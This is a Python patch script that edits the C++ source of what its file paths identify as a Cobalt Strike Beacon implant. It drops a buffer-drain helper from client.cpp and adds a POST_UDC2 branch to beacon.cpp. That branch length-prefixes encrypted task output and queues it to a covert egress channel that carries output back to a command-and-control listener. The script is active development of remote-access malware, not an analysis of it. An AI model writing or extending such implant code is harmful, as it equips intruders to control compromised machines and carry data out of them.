#!/usr/bin/env python3
"""Refix: POST_UDC2 branch in command_shell_post; drop client_write drain."""
import io

# 1) beacon.cpp: revert the engage drain, add the POST_UDC2 queue branch
p = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\beacon.cpp"
s = io.open(p, encoding="utf-8").read()

old_ext = """

/* tier-2 item6: drain aggregated callback output into the UDC2 egress */
extern int client_take_pending(char * out, int max);
extern void udc2_queue(char * data, int length);"""
assert s.count(old_ext) == 1
s = s.replace(old_ext, "\n\n/* tier-2 item6: engage-mode egress for encrypted callback chunks */\nextern void udc2_queue(char * data, int length);")

old_blk = """		if (beacon_cycles >= 1 && udc2_init()) {
			static char udc2_out[256 * 1024];
			int take;
			post_type = POST_UDC2;
			pivot_poll(command_shell_callback);
			download_poll(command_shell_callback, MAX_PACKET);
			link_poll(command_shell_callback);
			psh_poll(command_shell_callback, MAX_PACKET);
			if (check_kill_date())
				command_die(command_shell_callback);
			/* flush queued callback output into the UDC2 egress queue -
			 * in engage mode no HTTP submit ever drains it, so without
			 * this task output never leaves the process */
			take = client_take_pending(udc2_out, (int)sizeof(udc2_out));
			if (take > 0)
				udc2_queue(udc2_out, take);
			length = udc2_cycle(buffer, MAX_GET);"""
assert s.count(old_blk) == 1
s = s.replace(old_blk, """		if (beacon_cycles >= 1 && udc2_init()) {
			post_type = POST_UDC2;
			pivot_poll(command_shell_callback);
			download_poll(command_shell_callback, MAX_PACKET);
			link_poll(command_shell_callback);
			psh_poll(command_shell_callback, MAX_PACKET);
			if (check_kill_date())
				command_die(command_shell_callback);
			length = udc2_cycle(buffer, MAX_GET);""")

old_post = """	if (post_type == POST_HTTP) {
		/* 只有HTTP发送支持响应队列。如果要求则绕过队列 */
		http_put(post_url, cipherdata, bar, sendNow);
	}"""
assert s.count(old_post) == 1
s = s.replace(old_post, """	if (post_type == POST_HTTP) {
		/* 只有HTTP发送支持响应队列。如果要求则绕过队列 */
		http_put(post_url, cipherdata, bar, sendNow);
	}
	else if (post_type == POST_UDC2) {
		/* engage mode never submits the HTTP POST queue; carry each
		 * encrypted chunk in the classic [4B BE length][chunk] body
		 * format every listener frame expects (http_put shape) */
		unsigned int flen = htonl(bar);
		char head[4];
		memcpy(head, &flen, 4);
		udc2_queue(head, 4);
		udc2_queue(cipherdata, bar);
	}""")

io.open(p, "w", encoding="utf-8", newline="").write(s)
print("beacon.cpp refixed")

# 2) client.cpp: drop the now-unused accessor
p2 = r"C:\Users\Administrator\Desktop\cobaltstrike\CobaltStrikeBeaconCppSource-main\src\client.cpp"
s2 = io.open(p2, encoding="utf-8").read()
old_acc = """/* tier-2 item6: the UDC2 engage loop drains the same aggregated callback
 * output the HTTP submit path flushes. Moves up to max bytes out of the
 * write buffer and returns how much was taken (0 = nothing queued). */
int client_take_pending(char * out, int max) {
	int take = client_write_len;

	if (take > max)
		take = max;
	if (take <= 0)
		return 0;

	memcpy(out, client_write_buffer, take);
	client_write_len -= take;
	if (client_write_len > 0)
		memmove(client_write_buffer, client_write_buffer + take, client_write_len);
	return take;
}

void client_write(char * buffer, int len) {"""
assert s2.count(old_acc) == 1
s2 = s2.replace(old_acc, "void client_write(char * buffer, int len) {")
io.open(p2, "w", encoding="utf-8", newline="").write(s2)
print("client.cpp reverted")
